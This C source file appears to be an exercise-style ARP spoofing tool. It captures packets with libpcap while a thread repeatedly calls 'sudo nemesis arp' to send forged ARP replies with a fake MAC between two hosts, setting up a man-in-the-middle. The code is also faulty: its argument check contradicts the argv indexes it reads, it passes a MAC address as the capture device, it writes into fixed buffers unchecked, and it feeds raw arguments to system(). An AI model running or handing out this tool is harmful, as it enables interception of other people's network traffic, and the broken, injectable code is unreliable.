#include <pcap.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include "hacking.h"

void pcap_fatal(const char*,const char*);
void caught_packet(u_char*,const struct pcap_pkthdr*,const u_char*);
void *nemesis_thread(void*);

int main(int argc,char** argv){

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap_handle;
    pthread_t pthread;

    if(argc>4){
        printf("3 arguments is needed!\n");
        return 1;
    }

    pcap_handle=pcap_open_live(argv[3],4096,1,0,errbuf);
    if(pcap_handle==NULL)
       pcap_fatal("pcap_open_live",errbuf);
    printf("device is opened\n");
    pthread_create(&pthread,NULL,nemesis_thread,argv);
    printf("capture started\n");
    pcap_loop(pcap_handle,-1,caught_packet,NULL);
    pcap_close(pcap_handle);
    printf("handler closed\n");
    pthread_join(pthread,NULL);
    return 1;
    
}

void *nemesis_thread(void *argv){

    printf("thread started\n");
    char** info=(char**)argv;
    char* sender_ip=info[1];
    char* dest_ip=info[2];
    char* target_mac_id=info[3];
    char* device=info[4];
    char* my_mac_id="0a:00:27:00:00:00";
    char* nemesis1=(char*)malloc(100);
    char* nemesis2=(char*)malloc(100);

    sprintf(nemesis1,"sudo nemesis arp -S %s -D %s -h %s -m %s -d %s",sender_ip,dest_ip,my_mac_id,target_mac_id,device);
    sprintf(nemesis2,"sudo nemesis arp -D %s -S %s -h %s -m %s -d %s",sender_ip,dest_ip,my_mac_id,target_mac_id,device);

    for(int i=0;i<5;i++){
        system(nemesis1);
        system(nemesis2);
        system("sleep 5");
    }

    printf("thread is ended\n");

}

void caught_packet(u_char* user_args,const struct pcap_pkthdr* cap_header,const u_char *packet){
    printf("packet is captured  %d\n",cap_header->len);
}

void pcap_fatal(const char* failed_in, const char* errbuf){
    printf("fatal error:%s,%s\n",failed_in,errbuf);
}